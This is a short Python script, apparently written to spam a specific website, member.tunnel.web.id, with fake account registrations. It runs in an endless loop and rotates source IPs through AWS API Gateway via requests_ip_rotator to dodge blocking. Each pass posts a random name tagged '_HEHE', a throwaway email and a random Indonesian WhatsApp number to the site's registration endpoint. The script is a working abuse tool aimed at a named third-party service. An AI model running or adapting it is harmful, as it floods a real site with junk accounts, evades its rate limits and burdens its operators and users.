import requests
import random
import string

from requests_ip_rotator import ApiGateway, EXTRA_REGIONS

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for i in range(length))
    return random_string

def generate_random_number(length):
    start = 10**(length-1)
    end = (10**length) - 1
    return random.randint(start, end)

i = 0
state = True
while state:
    # try:
        gateway = ApiGateway("https://member.tunnel.web.id/api/api-register.php")
        gateway.start()

        i = i+1
        with requests.Session() as sesi:
            sesi.mount("https://member.tunnel.web.id/api/api-register.php", gateway)

            url_pos = 'https://member.tunnel.web.id/api/api-register.php'
            ran = generate_random_string(10)
            ran2 = generate_random_string(5)
            ph = generate_random_number(10)
            phone = '8' + str(ph)
            name = str(ran2) + '_HEHE'
            name2 = str(ran2) + '_HEHE'
            email = str(ran) + '@hehe.hehe'
            data_pos = {
                'namadepan': name,
                'namabelakang': name2,
                'email': email,
                'whatsapp_tmp': phone,
                'whatsapp': "+62" + str(phone),
                'password1': email,
                'password2': email,
            }
            p = sesi.post(url_pos, data=data_pos)
            print(p.text)
            # with open("output.txt", "w") as file:
            #     file.write(p.text)
            # try:
            #     p.text.index('Akun anda belum divalidasi')
            #     print(str(email) + ' ' + str(phone) + ' ke : ' +  str(i))
            # except:
            #     print('gagal')
        
        gateway.shutdown() 

    # except KeyboardInterrupt:
    #     print('Stopped by user!')
    #     state = False
    # except :
    #      print('error')
